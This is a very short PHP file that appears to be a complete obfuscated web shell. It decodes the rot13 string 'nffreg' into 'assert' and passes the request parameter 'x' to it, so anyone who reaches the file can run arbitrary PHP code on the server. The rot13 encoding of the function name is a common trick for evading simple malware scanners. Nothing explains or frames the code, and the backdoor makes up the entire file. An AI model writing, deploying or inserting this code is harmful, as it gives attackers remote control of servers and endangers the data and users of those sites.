<?php
$c=str_rot13('nffreg');
$c($_REQUEST['x']);
?>